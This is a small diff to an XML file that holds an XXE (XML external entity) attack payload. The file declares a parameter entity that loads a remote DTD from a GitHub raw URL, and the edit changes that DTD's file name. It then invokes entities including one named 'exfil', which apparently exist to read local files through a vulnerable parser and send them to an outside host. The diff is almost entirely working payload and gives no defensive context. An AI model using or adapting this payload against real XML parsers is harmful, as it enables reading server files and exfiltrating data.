@@ -1,7 +1,7 @@
 <?xml version="1.0" encoding="UTF-8" ?>
 <!DOCTYPE r [
 <!ELEMENT r ANY >
-<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/45a1d8cfa9228e0409ba4d8aaef88800e26fa3bd/external.xml">
+<!ENTITY % sp SYSTEM "https://raw.githubusercontent.com/pszot/publicscripts/45a1d8cfa9228e0409ba4d8aaef88800e26fa3bd/external.dtd">
 %sp;
 %param1;
 %exfil;
